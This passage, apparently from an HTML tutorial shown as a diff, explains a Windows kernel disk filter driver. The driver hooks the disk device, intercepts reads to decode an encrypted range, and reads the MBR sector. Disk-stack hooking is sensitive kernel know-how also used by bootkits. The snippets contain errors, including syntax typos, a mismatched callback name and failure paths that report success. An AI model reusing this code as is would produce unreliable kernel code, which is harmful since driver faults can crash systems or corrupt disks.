+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>hookDevice<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>NT_SUCCESS<span style="color: black;">&#40;</span>status<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> STATUS_SUCCESS<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt <span style="color: #339933;">=</span> hookDevice<span style="color: #339933;">-&gt;</span>DeviceExtension<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>DeviceObject<span style="color: #339933;">=</span>hookDevice<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>DriverObject<span style="color: #339933;">=</span>DriverObject<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Get unicode device name.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/sprintf.html"><span style="color: #000066;">sprintf</span></a><span style="color: black;">&#40;</span>DiskName<span style="color: #339933;">,</span> DiskDeviceName<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RtlInitAnsiString<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>DiskNameA<span style="color: #339933;">,</span> DiskName<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RtlAnsiStringToUnicodeString<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>unicodeDiskName<span style="color: #339933;">,&amp;</span>DiskNameA<span style="color: #339933;">,</span>TRUE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// There are two typed &nbsp;of &nbsp;getting information: buffered or di-</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// IO. Buffered IO are used for device which can wait, for exam-</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// ple &nbsp;keyboards, mouses &nbsp;etc. Direct &nbsp;IO are &nbsp;for disk device,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// floppy device, CD-ROM and so on.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hookDevice<span style="color: #339933;">-&gt;</span>Flags <span style="color: #339933;">|=</span> DO_DIRECT_IO<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hookDevice<span style="color: #339933;">-&gt;</span>Flags <span style="color: #339933;">&amp;=</span> ~DO_DEVICE_INITIALIZING<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Hook the device.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; status <span style="color: #339933;">=</span> IoAttachDevice<span style="color: black;">&#40;</span>hookDevice<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>unicodeDiskName<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>NT_SUCCESS<span style="color: black;">&#40;</span>status<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> STATUS_SUCCESS<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> STATUS_SUCCESS<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS Dispatch<span style="color: black;">&#40;</span>PDEVICE_OBJECT DeviceObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIRP Irp<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_EXTENSION devExt <span style="color: #339933;">=</span> DeviceObject<span style="color: #339933;">-&gt;</span>DeviceExtension<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// We won't do any operations, set the next lower driver.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Irp<span style="color: #339933;">-&gt;</span>CurrentLocation<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Irp<span style="color: #339933;">-&gt;</span>Tail.<span style="color: #202020;">Overlay</span>.<span style="color: #202020;">CurrentStackLocation</span><span style="color: #339933;">++;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> IoCallDriver<span style="color: black;">&#40;</span>devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span> Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS Read<span style="color: black;">&#40;</span>PDEVICE_OBJECT DeviceObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIRP Irp<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIO_STACK_LOCATION currentIrpStack<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIO_STACK_LOCATION nextIrpStack<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_EXTENSION &nbsp;devExt <span style="color: #339933;">=</span> DeviceObject<span style="color: #339933;">-&gt;</span>DeviceExtension<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IO_STATUS_BLOCK &nbsp; &nbsp;IoStatus<span style="color: #339933;">;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Get the current input parameters.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; currentIrpStack <span style="color: #339933;">=</span> &nbsp;IoGetCurrentIrpStackLocation<span style="color: black;">&#40;</span>Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Get IRP parameters</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// ... how many bytes the system wants to read</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>Length &nbsp;<span style="color: #339933;">=</span> currentIrpStack<span style="color: #339933;">-&gt;</span>Parameters.<span style="color: #202020;">Read</span>.<span style="color: #202020;">Length</span><span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>howMany <span style="color: #339933;">=</span> devExt<span style="color: #339933;">-&gt;</span>Length <span style="color: #339933;">/</span> <span style="color: #0000dd;">512</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// ... where is starting offset of the request ?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>Offset &nbsp;<span style="color: #339933;">=</span> currentIrpStack<span style="color: #339933;">-&gt;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Parameters.<span style="color: #202020;">Read</span>.<span style="color: #202020;">ByteOffset</span>.<span style="color: #202020;">LowPart</span><span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// ... get the output buffer</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>buffer &nbsp;<span style="color: #339933;">=</span> MmGetSystemAddressForMdl<span style="color: black;">&#40;</span>Irp<span style="color: #339933;">-&gt;</span>MdlAddress<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Now &nbsp;check the range of &nbsp;encryption and &nbsp;find out if you must</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// decode read request or not.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...<br/>
+&nbsp;</div>
+<p>Now we have two ways go back, normal through return value or we can use callback.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Normal returning way (set next lower driver)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Irp<span style="color: #339933;">-&gt;</span>CurrentLocation<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Irp<span style="color: #339933;">-&gt;</span>Tail.<span style="color: #202020;">Overlay</span>.<span style="color: #202020;">CurrentStackLocation</span><span style="color: #339933;">++;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> IoCallDriver<span style="color: black;">&#40;</span>devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span> Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; OR<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Set the callback</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Copy next current stack to the lower one.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; currentIrpStack <span style="color: #339933;">=</span> IoGetCurrentIrpStackLocation<span style="color: black;">&#40;</span>Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nextIrpStack <span style="color: #339933;">=</span> IoGetNextIrpStackLocation<span style="color: black;">&#40;</span>Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>nextIrpStack <span style="color: #339933;">=</span> <span style="color: #339933;">*</span>currentIrpStack<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IoSetCompletionRoutine<span style="color: black;">&#40;</span>Irp<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DiskReadCompletion<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DeviceObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TRUE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TRUE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;TRUE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>What's inside callback?</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS DiskReadNoCompletion<span style="color: black;">&#40;</span>IN PDEVICE_OBJECT DeviceObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN PIRP Irp<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IN PVOID Context<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIO_STACK_LOCATION IrpSp<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_EXTENSION devExt <span style="color: #339933;">=</span> DeviceObject<span style="color: #339933;">-&gt;</span>DeviceExtension<span style="color: #339933;">;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Get current Irp stack == input parameters</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IrpSp <span style="color: #339933;">=</span> IoGetCurrentIrpStackLocation<span style="color: black;">&#40;</span>Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// If the operation was successful...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>NT_SUCCESS<span style="color: black;">&#40;</span>Irp<span style="color: #339933;">-&gt;</span>IoStatus.<span style="color: #202020;">Status</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">// Check Irp parameters (see above)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;...<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Mark the Irp pending if required</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>Irp<span style="color: #339933;">-&gt;</span>PendingReturned<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IoMarkIrpPending<span style="color: black;">&#40;</span>Irp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> STATUS_SUCCESS<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Also highly recommend to read DDK2k about the drivers.</p>
+<h4><a name="p343"></a>3.4.3. Disk Operations</h4>
+<p>To call all disk operations like reading, writing, verifying you must you these functions:</p>
+<ul>
+<li>IoBuildSynchronousFsdRequest: can be used only during starting of the driver because here we can wait for other thread yet.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS DiskLoadMBRSector<span style="color: black;">&#40;</span>IN PDEVICE_OBJECT DeviceObject<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PDEVICE_EXTENSION devExt <span style="color: #339933;">=</span> DeviceObject<span style="color: #339933;">-&gt;</span>DeviceExtension<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IO_STATUS_BLOCK &nbsp; IoStatus<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LARGE_INTEGER &nbsp; &nbsp; offset<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NTSTATUS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;status<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; KEVENT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;event<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PIRP &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;localIrp<span style="color: #339933;">;</span><br/>
+<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Set BootSector's starting offset</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; offset.<span style="color: #202020;">HighPart</span> <span style="color: #339933;">=</span> offset.<span style="color: #202020;">LowPart</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Initilize event for synchronous equest.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; KeInitializeEvent<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>event<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NotificationEvent<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FALSE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Build Irp request.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; localIrp <span style="color: #339933;">=</span> IoBuildSynchronousFsdRequest<span style="color: black;">&#40;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IRP_MJ_READ<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>devExt<span style="color: #339933;">-&gt;</span>MBRSector<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>offset<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>event<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>IoStatus<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>localIrp <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> STATUS_UNSUCCESSFUL<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>IoCallDriver<span style="color: black;">&#40;</span>devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span> localIrp<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">==</span> STATUS_PENDING<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KeWaitForSingleObject<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>event<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Suspended<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KernelMode<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FALSE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> NT_SUCCESS<span style="color: black;">&#40;</span>IoStatus.<span style="color: #202020;">Status</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div></li>
+<li>IoBuildAsynchronousFsdRequest: used only in Dispatch routines.
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ...<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #202020;">offset</span>.<span style="color: #202020;">HighPart</span> <span style="color: #339933;">=</span> offset.<span style="color: #202020;">LowPart</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Build asynchronous Irp request</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; localIrp <span style="color: #339933;">=</span> IoBuildAsynchronousFsdRequest<span style="color: black;">&#40;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IRP_MJ_READ<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>devExt<span style="color: #339933;">-&gt;</span>MBRSector<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">512</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>offset<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>localIrp<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> STATUS_UNSUCCESSFUL<span style="color: #339933;">;</span><br/>
+<br/>
